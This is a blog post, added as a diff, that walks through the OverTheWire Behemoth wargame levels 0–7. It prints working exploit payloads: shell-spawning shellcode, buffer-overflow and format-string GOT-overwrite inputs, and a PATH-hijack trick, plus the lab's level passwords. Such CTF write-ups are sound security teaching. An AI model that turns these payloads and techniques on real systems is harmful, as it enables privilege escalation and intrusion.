@@ -1,0 +1,640 @@
+---
+layout: post
+title:  "OverTheWire: Behemoth"
+date:   2021-03-06 20:07:56 +0200
+categories: overthewire
+---
+Continuing where we left off at the OverTheWire challenges, we are up against the ```Behemoth```.
+To quote the website:
+
+This wargame deals with a lot of regular vulnerabilities found commonly 'out 
+in the wild'. While the game makes no attempts at emulating a real environment
+it will teach you how to exploit several of the most common coding mistakes 
+including buffer overflows, race conditions and privilege escalation.
+
+From my experience with the OverTheWire challenges, I bet this is going to be a good one.
+
+## Level 0 ##
+This one was pretty simple, the binary prompts us for a password and, if we are to analyse it using ```ltrace```, we will see it compares our input to ```eatmyshorts```
+```
+behemoth0@behemoth:/behemoth$ ltrace ./behemoth0
+__libc_start_main(0x80485b1, 1, 0xffffd784, 0x8048680 <unfinished ...>
+printf("Password: ")                                            = 10
+__isoc99_scanf(0x804874c, 0xffffd68b, 0xf7fc5000, 13Password: lol
+)           = 1
+strlen("OK^GSYBEX^Y")                                           = 11
+strcmp("lol", "eatmyshorts")                                    = 1
+puts("Access denied.."Access denied..
+)                                         = 16
++++ exited (status 0) +++
+behemoth0@behemoth:/behemoth$ ./behemoth0
+Password: eatmyshorts
+Access granted..
+$ whoami
+behemoth1
+$ cat /etc/behemoth_pass/behemoth1
+aesebootiv
+```
+
+## Level 1 ##
+The same can be said about this level's binary, except that now we don't see a ```strcmp```... but,
+ ```
+ behemoth1@behemoth:/behemoth$ ltrace ./behemoth1
+ __libc_start_main(0x804844b, 1, 0xffffd784, 0x8048480 <unfinished ...>
+ printf("Password: ")                                            = 10
+ gets(0xffffd6a5, 0xffffd784, 0xf7ffcd00, 0x200000Password: lol
+ )              = 0xffffd6a5
+ puts("Authentication failure.\nSorry."Authentication failure.
+ Sorry.
+ )                         = 31
+ +++ exited (status 0) +++
+ ```
+We can see a ```gets```! Easy win! Let's check the mitigations as well.
+  
+```
+behemoth1@behemoth:/behemoth$ checksec ./behemoth1
+[*] '/behemoth/behemoth1'
+     Arch:     i386-32-little
+     RELRO:    No RELRO
+     Stack:    No canary found
+     NX:       NX disabled
+     PIE:      No PIE (0x8048000)
+     RWX:      Has RWX segments
+```
+
+Easy win! Now let's get the address of ```system``` and call it with ```/bin/sh```.
+
+Now, just like in the before challenges, let's remove ```GDB```'s additional environment variables first. Though it probably doesn't matter since ```libc``` is already loaded in memory and shared by most processes.
+```
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) set env _ /behemoth/behemoth1
+```
+
+Now for ```system```'s address.
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
+```
+
+And for the offset, we will look at the disassembly
+```
+ 0804844b <main>:
+ 804844b:       55                      push   ebp
+ 804844c:       89 e5                   mov    ebp,esp
+ 804844e:       83 ec 44                sub    esp,0x44
+ 8048451:       68 00 85 04 08          push   0x8048500
+ 8048456:       e8 a5 fe ff ff          call   8048300 <printf@plt>
+ 804845b:       83 c4 04                add    esp,0x4
+ 804845e:       8d 45 bd                lea    eax,[ebp-0x43]
+ 8048461:       50                      push   eax
+ 8048462:       e8 a9 fe ff ff          call   8048310 <gets@plt>
+ 8048467:       83 c4 04                add    esp,0x4
+ 804846a:       68 0c 85 04 08          push   0x804850c
+ 804846f:       e8 ac fe ff ff          call   8048320 <puts@plt>
+ 8048474:       83 c4 04                add    esp,0x4
+ 8048477:       b8 00 00 00 00          mov    eax,0x0
+ 804847c:       c9                      leave
+ 804847d:       c3                      ret
+ 804847e:       66 90                   xchg   ax,ax
+```
+
+As it can be seen until our return address there are 0x43 + 4 bytes, so 71 bytes.
+
+```
+behemoth1@behemoth:/behemoth$ python -c 'print "a" * 71 + "\x50\xc8\xe4\xf7" + "a" * 4 + "/bin/sh\x0
+> /tmp/payload
+behemoth1@behemoth:/behemoth$ cat /tmp/payload - | ./behemoth1
+Password: Authentication failure.
+Sorry.
+ls
+Segmentation fault
+```
+
+Damn it, it doesn't work, let's try passing our shellcode through an environment variable then.
+
+```
+behemoth1@behemoth:/behemoth$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+```
+
+Let's also use this source code to find out its address:
+```
+behemoth1@behemoth:/tmp$ cat getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main ()
+{
+        printf("EGG : %p\n", getenv("EGG"));
+        return 0;
+}
+
+behemoth1@behemoth:/tmp$ gcc -m32 getenv.c -o getenv
+```
+
+After compiling it, execute it and use that address in our payload.
+
+```
+behemoth1@behemoth:/behemoth$ /tmp/getenv
+EGG : 0xffffdea2
+behemoth1@behemoth:/behemoth$ python -c 'print "a" * 71 + "\xa2\xde\xff\xff"' > /tmp/payload
+behemoth1@behemoth:/behemoth$ cat /tmp/payload - | ./behemoth1
+Password: Authentication failure.
+Sorry.
+ls
+behemoth0  behemoth2  behemoth4  behemoth6         behemoth7
+behemoth1  behemoth3  behemoth5  behemoth6_reader
+whoami
+behemoth2
+cat /etc/behemoth_pass/behemoth2
+eimahquuof
+```
+
+BOOM!
+
+## Level 2 ##
+If we tried to run the binary, it would just hang, but it gives us an interesting message
+```
+behemoth2@behemoth:/behemoth$ ./behemoth2
+touch: cannot touch '17849': Permission denied
+whoami
+wtf
+^C
+```
+Let's trace the system calls
+```
+behemoth2@behemoth:/behemoth$ strace ./behemoth2
+execve("./behemoth2", ["./behemoth2"], [/* 18 vars */]) = 0
+strace: [ Process PID=17942 runs in 32 bit mode. ]
+brk(NULL)                               = 0x804b000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
+mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
+mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
+mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
+mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
+close(3)                                = 0
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
+set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
+munmap(0xf7fc9000, 36357)               = 0
+getpid()                                = 17942
+lstat64("17942", 0xffffd5b0)            = -1 ENOENT (No such file or directory)
+unlink("17942")                         = -1 ENOENT (No such file or directory)
+geteuid32()                             = 13002
+geteuid32()                             = 13002
+setreuid32(13002, 13002)                = 0
+rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xffffd4f0) = 17943
+waitpid(17943, touch: cannot touch '17942': Permission denied
+[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0) = 17943
+rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
+rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17943, si_uid=13002, si_status=1, si_utime=0,
+si_stime=0} ---
+nanosleep({tv_sec=2000, tv_nsec=0},
+```
+
+Oh, nevermind, there is a call to ```nanosleep```... this hints us towards a possible race condition.
+
+Let's also library trace it
+```
+behemoth2@behemoth:/behemoth$ ltrace ./behemoth2
+__libc_start_main(0x804856b, 1, 0xffffd784, 0x8048660 <unfinished ...>
+getpid()                                                        = 18197
+sprintf("touch 18197", "touch %d", 18197)                       = 11
+__lxstat(3, "18197", 0xffffd650)                                = -1
+unlink("18197")                                                 = -1
+geteuid()                                                       = 13002
+geteuid()                                                       = 13002
+setreuid(13002, 13002)                                          = 0
+system("touch 18197"touch: cannot touch '18197': Permission denied
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                          = 256
+sleep(2000
+```
+
+Ah, I see! So it tries to create a file named after its ```PID```. Luckily for us, ```touch``` is called without an absolute path. The only reason we cannot get the ```system``` call to work is because we don't have write permissions to ```/behemoth``` so let's switch to a directory where we can do whatever we want.
+
+```
+behemoth2@behemoth:/behemoth$ cd /tmp
+behemoth2@behemoth:/tmp$ mkdir me
+behemoth2@behemoth:/tmp$ cd me
+behemoth2@behemoth:/tmp/me$ echo "cat /etc/behemoth_pass/behemoth3" > touch
+behemoth2@behemoth:/tmp/me$ chmod +x touch
+behemoth2@behemoth:/tmp/me$ PATH=/tmp/me:$PATH /behemoth/behemoth2
+nieteidiel
+```
+
+## Level 3 ##
+Looks like we have to do with some input validation... again.
+
+```
+behemoth3@behemoth:~$ cd /behemoth
+behemoth3@behemoth:/behemoth$ ./behemoth3
+Identify yourself: It's a Me, Mario!
+Welcome, It's a Me, Mario!
+
+aaaand goodbye again.
+```
+
+Neither ```strace```, nor ```ltrace``` will yield us any useful information. Let's look at the disassembly!
+
+```
+ 0804847b <main>:
+ 804847b:       55                      push   ebp
+ 804847c:       89 e5                   mov    ebp,esp
+ 804847e:       81 ec c8 00 00 00       sub    esp,0xc8
+ 8048484:       68 60 85 04 08          push   0x8048560
+ 8048489:       e8 a2 fe ff ff          call   8048330 <printf@plt>
+ 804848e:       83 c4 04                add    esp,0x4
+ 8048491:       a1 c0 97 04 08          mov    eax,ds:0x80497c0
+ 8048496:       50                      push   eax
+ 8048497:       68 c8 00 00 00          push   0xc8
+ 804849c:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
+ 80484a2:       50                      push   eax
+ 80484a3:       e8 98 fe ff ff          call   8048340 <fgets@plt>
+ 80484a8:       83 c4 0c                add    esp,0xc
+ 80484ab:       68 74 85 04 08          push   0x8048574
+ 80484b0:       e8 7b fe ff ff          call   8048330 <printf@plt>
+ 80484b5:       83 c4 04                add    esp,0x4
+ 80484b8:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
+ 80484be:       50                      push   eax
+ 80484bf:       e8 6c fe ff ff          call   8048330 <printf@plt>
+ 80484c4:       83 c4 04                add    esp,0x4
+ 80484c7:       68 7e 85 04 08          push   0x804857e
+ 80484cc:       e8 7f fe ff ff          call   8048350 <puts@plt>
+ 80484d1:       83 c4 04                add    esp,0x4
+ 80484d4:       b8 00 00 00 00          mov    eax,0x0
+ 80484d9:       c9                      leave
+ 80484da:       c3                      ret
+ 80484db:       66 90                   xchg   ax,ax
+ 80484dd:       66 90                   xchg   ax,ax
+ 80484df:       90                      nop
+```
+
+Brilliant! We got a format string vulnerability, right here:
+
+```
+ 80484b8:       8d 85 38 ff ff ff       lea    eax,[ebp-0xc8]
+ 80484be:       50                      push   eax
+ 80484bf:       e8 6c fe ff ff          call   8048330 <printf@plt>
+```
+
+The second printf is hidden! It only outputs our input directly. Now we just need to overwrite the ```GOT``` entry of ```puts``` with the address of our shellcode and we will get a shell!
+
+```
+behemoth3@behemoth:/behemoth$ objdump -R behemoth3
+
+behemoth3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049794 R_386_GLOB_DAT    __gmon_start__
+080497c0 R_386_COPY        stdin@@GLIBC_2.0
+080497a4 R_386_JUMP_SLOT   printf@GLIBC_2.0
+080497a8 R_386_JUMP_SLOT   fgets@GLIBC_2.0
+080497ac R_386_JUMP_SLOT   puts@GLIBC_2.0
+080497b0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+```
+
+Alright, we have our ```GOT``` address, now, let's see where exactly in memory our input is.
+
+```
+gdb-peda$ x/20wx $esp
+0xffffd5fc:     0xffffd600      0x61616161      0xf7fe000a      0x08048200
+0xffffd60c:     0xffffd678      0xf7ffda7c      0x00000001      0xf7fd3110
+0xffffd61c:     0x00000001      0x00000000      0x00000001      0xf7ffd920
+0xffffd62c:     0xf7ea2d0b      0xffffd65e      0x00000000      0xf7fe3100
+0xffffd63c:     0xf7ffdc10      0xffffd65f      0x0000004d      0x002c307d
+```
+
+This is the memory layout before the important ```printf``` is called and our input would be the second parameter to ```printf``` (format string included)
+
+```
+behemoth3@behemoth:/behemoth$ ./behemoth3
+Identify yourself: aaaa.%08x
+Welcome, aaaa.61616161
+
+aaaand goodbye again.
+```
+Yep, I was right, it is the next parameter. Luckily, I was trained in this art back when I was solving the ```Exploit Education``` challenges, this is going to be easy! :)
+Now, let's place our shellcode, and find its address with the same executable as before.
+
+```
+behemoth3@behemoth:/behemoth$ export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
+behemoth3@behemoth:/behemoth$ /tmp/getenv
+0xffffde79
+behemoth3@behemoth:/behemoth$ (python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08" + "a" * 4  + "%56941x%1$hn%8586x%2$hn"';cat) | ./behemoth3
+whoami
+behemoth4
+cat /etc/behemoth_pass/behemoth4
+ietheishei
+```
+
+Luckily, unlike Phoenix, this one allowed us to use the ```$``` format string properly.
+
+## Level 4 ##
+
+Running this level's binary shows us the following:
+```
+behemoth4@behemoth:/behemoth$ ./behemoth4
+PID not found!
+```
+
+By running ```ltrace```, we can see the following:
+```
+getpid()                                = 3437
+brk(0)                                  = 0x804b000
+brk(0x806c000)                          = 0x806c000
+open("/tmp/3437", O_RDONLY)             = -1 ENOENT (No such file or directory)
+```
+So it tries to open a file named after its ```PID```. I am going to create a file named ```/tmp/4000```, as it is in the range of potential ```PID```'s and execute the binary until it is successful.
+
+Finally, after a few tries, we get the output:
+```
+behemoth4@behemoth:/behemoth$ ./behemoth4
+password: FInished sleeping, fgetcing
+aizeeshing
+```
+
+## Level 5 ##
+
+This one seems to want to open the password file directly, but obviously we are not allowed to do that as ```behemoth5```:
+```
+behemoth5@behemoth:/behemoth$ ltrace ./behemoth5
+__libc_start_main(0x804872b, 1, 0xffffd784, 0x8048920 <unfinished ...>
+fopen("/etc/behemoth_pass/behemoth6", "r")                      = 0
+perror("fopen"fopen: Permission denied
+)                                                 = <void>
+exit(1 <no return ...>
++++ exited (status 1) +++
+```
+
+However, if we run it by itself, it seems to work and the error isn't shown.
+
+Looking at the disassembly we can see that it connects to port 1337 (classic, huh) and sends a message.
+
+```
+8048838:       e8 b3 fd ff ff          call   80485f0 <ket@plt>
+ 804883d:       83 c4 10                add    esp,0x10
+ 8048840:       89 45 e4                mov    DWORD PTR [ebp-0x1c],eax
+ 8048843:       83 7d e4 ff             cmp    DWORD PTR [ebp-0x1c],0xffffffff
+ 8048847:       75 1a                   jne    8048863 <main+0x138>
+ 8048849:       83 ec 0c                sub    esp,0xc
+ 804884c:       68 dd 89 04 08          push   0x80489dd
+ 8048851:       e8 fa fc ff ff          call   8048550 <perror@plt>
+ 8048856:       83 c4 10                add    esp,0x10
+ 8048859:       83 ec 0c                sub    esp,0xc
+ 804885c:       6a 01                   push   0x1
+ 804885e:       e8 0d fd ff ff          call   8048570 <exit@plt>
+ 8048863:       66 c7 45 d0 02 00       mov    WORD PTR [ebp-0x30],0x2
+ 8048869:       83 ec 0c                sub    esp,0xc
+ 804886c:       68 e4 89 04 08          push   0x80489e4
+ 8048871:       e8 6a fd ff ff          call   80485e0 <atoi@plt>
+ 8048876:       83 c4 10                add    esp,0x10
+ 8048879:       0f b7 c0                movzx  eax,ax
+ 804887c:       83 ec 0c                sub    esp,0xc
+ 804887f:       50                      push   eax
+ 8048880:       e8 ab fc ff ff          call   8048530 <htons@plt>
+ 8048885:       83 c4 10                add    esp,0x10
+ 8048888:       66 89 45 d2             mov    WORD PTR [ebp-0x2e],ax
+ 804888c:       8b 45 e8                mov    eax,DWORD PTR [ebp-0x18]
+ 804888f:       8b 40 10                mov    eax,DWORD PTR [eax+0x10]
+ 8048892:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048894:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048896:       89 45 d4                mov    DWORD PTR [ebp-0x2c],eax
+ 8048899:       83 ec 04                sub    esp,0x4
+ 804889c:       6a 08                   push   0x8
+ 804889e:       6a 00                   push   0x0
+ 80488a0:       8d 45 d0                lea    eax,[ebp-0x30]
+ 80488a3:       83 c0 08                add    eax,0x8
+ 80488a6:       50                      push   eax
+ 80488a7:       e8 14 fd ff ff          call   80485c0 <memset@plt>
+ 80488ac:       83 c4 10                add    esp,0x10
+ 80488af:       83 ec 0c                sub    esp,0xc
+ 80488b2:       ff 75 ec                push   DWORD PTR [ebp-0x14]
+ 80488b5:       e8 c6 fc ff ff          call   8048580 <strlen@plt>
+ 80488ba:       83 c4 10                add    esp,0x10
+ 80488bd:       89 c2                   mov    edx,eax
+ 80488bf:       83 ec 08                sub    esp,0x8
+ 80488c2:       6a 10                   push   0x10
+ 80488c4:       8d 45 d0                lea    eax,[ebp-0x30]
+ 80488c7:       50                      push   eax
+ 80488c8:       6a 00                   push   0x0
+ 80488ca:       52                      push   edx
+ 80488cb:       ff 75 ec                push   DWORD PTR [ebp-0x14]
+ 80488ce:       ff 75 e4                push   DWORD PTR [ebp-0x1c]
+ 80488d1:       e8 fa fc ff ff          call   80485d0 <sendto@plt>
+ 80488d6:       83 c4 20                add    esp,0x20
+ 80488d9:       89 45 e0                mov    DWORD PTR [ebp-0x20],eax
+ 80488dc:       83 7d e0 ff             cmp    DWORD PTR [ebp-0x20],0xffffffff
+ 80488e0:       75 1a                   jne    80488fc <main+0x1d1>
+ 80488e2:       83 ec 0c                sub    esp,0xc
+```
+
+If we try to listen on that port we get our flag:
+
+```
+behemoth5@behemoth:~$ nc -ulp 1337
+mayiroeche
+```
+
+## Level 6 ##
+
+This time it looks like we are given two executables, as ```behemoth6_reader``` has an ```ELF``` format as well
+```
+behemoth6@behemoth:/behemoth$ file behemoth6_reader
+behemoth6_reader: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9510a50101cb24e6d6b7b8cfd3e4f4bbdad46de6, not stripped
+behemoth6@behemoth:/behemoth$ ./behemoth6_reader
+Couldn't open shellcode.txt!
+```
+
+And this is the ```ltrace``` of the two:
+
+```
+behemoth6@behemoth:/behemoth$ ltrace ./behemoth6_reader
+__libc_start_main(0x80485ab, 1, 0xffffd774, 0x80486b0 <unfinished ...>
+fopen("shellcode.txt", "r")                                     = 0
+puts("Couldn't open shellcode.txt!"Couldn't open shellcode.txt!
+)                            = 29
++++ exited (status 0) +++
+behemoth6@behemoth:/behemoth$ ltrace ./behemoth6
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486d0 <unfinished ...>
+popen("/behemoth/behemoth6_reader", "r")                        = 0x804b008
+malloc(10)                                                      = 0x804b0b8
+fread(0x804b0b8, 10, 1, 0x804b008)                              = 1
+--- SIGCHLD (Child exited) ---
+pclose(0x804b008)                                               = 0
+strcmp("Couldn't o", "HelloKitty")                              = -1
+puts("Incorrect output."Incorrect output.
+)                                       = 18
++++ exited (status 0) +++
+```
+
+Looks like the second executable compares the output of the first to ```HelloKitty```. So we will have to write a file ```shellcode.txt``` containing the shellcode used to print the string ```HelloKitty```.
+```
+ BITS 32
+ global main
+ 
+ main:
+    	push 000007974 ; "ty"     
+	push 0x74694b6f ; "oKit"
+	push 0x6c6c6548 ; "Hell"
+	mov eax, 4 ; write syscall
+	mov ebx, 1 ; stdout
+	mov ecx, esp ; address of "HelloKitty"
+	mov edx, 10 ; size of "HelloKitty"
+	int 0x80 ; kernel tap
+	
+	mov eax, 1 ; exit syscall
+	xor ebx, ebx ; exit(0)
+	int 0x80 ; kernel tap
+```
+This is the shellcode. Proof it works:
+```
+behemoth6@behemoth:/tmp/me2$ nasm -f elf32 shellcode.s -o shellcode.o
+behemoth6@behemoth:/tmp/me2$ ld -melf_i386 shellcode.o -o shellcode
+ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
+behemoth6@behemoth:/tmp/me2$ ./shellcode
+HelloKitty
+```
+
+Alright, now we will write the shellcode into ```shellcode.txt``` and run the executable.
+
+```
+shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <main>:
+ 8048060:       68 74 79 00 00          push   0x7974
+ 8048065:       68 6f 4b 69 74          push   0x74694b6f
+ 804806a:       68 48 65 6c 6c          push   0x6c6c6548
+ 804806f:       b8 04 00 00 00          mov    eax,0x4
+ 8048074:       bb 01 00 00 00          mov    ebx,0x1
+ 8048079:       89 e1                   mov    ecx,esp
+ 804807b:       ba 0a 00 00 00          mov    edx,0xa
+ 8048080:       cd 80                   int    0x80
+ 8048082:       b8 01 00 00 00          mov    eax,0x1
+ 8048087:       31 db                   xor    ebx,ebx
+ 8048089:       cd 80                   int    0x80
+```
+```
+behemoth6@behemoth:/tmp/me2$ /behemoth/behemoth6
+Correct.
+$ whoami
+behemoth7
+$ cat /etc/behemoth_pass/behemoth7
+baquoxuafo
+```
+
+Success!
+
+## Level 7 ##
+
+Last level!
+
+The binary on its own doesn't seem to do much, but looking at its ```ltrace``` we can see that it erases all of the environment variables.
+```
+behemoth7@behemoth:/behemoth$ ./behemoth7
+behemoth7@behemoth:/behemoth$ ltrace ./behemoth7
+__libc_start_main(0x804852b, 1, 0xffffd784, 0x8048650 <unfinished ...>
+strlen("LC_ALL=en_US.UTF-8")                                    = 18
+memset(0xffffd8ae, '\0', 18)                                    = 0xffffd8ae
+strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                   = 1467
+memset(0xffffd8c1, '\0', 1467)                                  = 0xffffd8c1
+strlen("SSH_CONNECTION=82.76.50.24 53472"...)                   = 50
+memset(0xffffde7d, '\0', 50)                                    = 0xffffde7d
+strlen("LANG=en_US.UTF-8")                                      = 16
+memset(0xffffdeb0, '\0', 16)                                    = 0xffffdeb0
+strlen("USER=behemoth7")                                        = 14
+memset(0xffffdec1, '\0', 14)                                    = 0xffffdec1
+strlen("PWD=/behemoth")                                         = 13
+memset(0xffffded0, '\0', 13)                                    = 0xffffded0
+strlen("HOME=/home/behemoth7")                                  = 20
+memset(0xffffdede, '\0', 20)                                    = 0xffffdede
+strlen("SSH_CLIENT=82.76.50.24 53472 22")                       = 31
+memset(0xffffdef3, '\0', 31)                                    = 0xffffdef3
+strlen("SSH_TTY=/dev/pts/1")                                    = 18
+memset(0xffffdf13, '\0', 18)                                    = 0xffffdf13
+strlen("MAIL=/var/mail/behemoth7")                              = 24
+memset(0xffffdf26, '\0', 24)                                    = 0xffffdf26
+strlen("TERM=st-256color")                                      = 16
+memset(0xffffdf3f, '\0', 16)                                    = 0xffffdf3f
+strlen("SHELL=/bin/bash")                                       = 15
+memset(0xffffdf50, '\0', 15)                                    = 0xffffdf50
+strlen("TMOUT=1800")                                            = 10
+memset(0xffffdf60, '\0', 10)                                    = 0xffffdf60
+strlen("SHLVL=1")                                               = 7
+memset(0xffffdf6b, '\0', 7)                                     = 0xffffdf6b
+strlen("LOGNAME=behemoth7")                                     = 17
+memset(0xffffdf73, '\0', 17)                                    = 0xffffdf73
+strlen("PATH=/usr/local/bin:/usr/bin:/bi"...)                   = 61
+memset(0xffffdf85, '\0', 61)                                    = 0xffffdf85
+strlen("OLDPWD=/home/behemoth7")                                = 22
+memset(0xffffdfc3, '\0', 22)                                    = 0xffffdfc3
+strlen("_=/usr/bin/ltrace")                                     = 17
+memset(0xffffdfda, '\0', 17)                                    = 0xffffdfda
++++ exited (status 0) +++
+```
+Looking at the disassembly, we can clearly see that it also jumps to the end of the program if no commandline argument is provided:
+```
+ 804859f:       83 7d 08 01             cmp    DWORD PTR [ebp+0x8],0x1
+ 80485a3:       0f 8e 9a 00 00 00       jle    8048643 <main+0x118>
+ 80485a9:       eb 6d                   jmp    8048618 <main+0xed>
+```
+
+Another essential thing we can see is that there is a guaranteed possibility for buffer overflow:
+```
+ 804862b:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 804862e:       83 c0 04                add    eax,0x4
+ 8048631:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048633:       50                      push   eax
+ 8048634:       8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
+ 804863a:       50                      push   eax
+ 804863b:       e8 70 fd ff ff          call   80483b0 <strcpy@plt>
+```
+It copies our provided string from the commandline argument into the stack, at offset ```0x20c``` from the saved base pointer, so, in order to overflow the saved return address, all we need to do is provide ```0x20c + 0x8``` byes!
+Proof:
+
+```
+behemoth7@behemoth:/behemoth$ ./behemoth7 $(python -c 'print "a" * (0x20c + 0x8)')
+Segmentation fault
+```
+
+Using the same technique as before, we find the address on the stack where our shellcode will be positioned and we will also add some nop's to guarantee that it lands where we want it to.
+```
+behemoth7@behemoth:/behemoth$ ./behemoth7 $(python -c "print 528 * '\x41' + '\xff\xd7\xff\xff' + 500 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+$ whoami
+behemoth8
+$ ls /etc/behemoth_pass
+behemoth0  behemoth1  behemoth2  behemoth3  behemoth4  behemoth5  behemoth6  behemoth7  behemoth8
+$ cat /etc/behemoth_pass/behemoth8
+pheewij7Ae
+```
+
+Brilliant!
+
+## Conclusion ##
+This was fun and definetely challenging! It was very much like Narnia, but the format string vulnerability was very clever, much like Phoenix's Format challenges from Exploit Education.
+I will soon try to solve the challenges offered by ```Utumno``` as well!
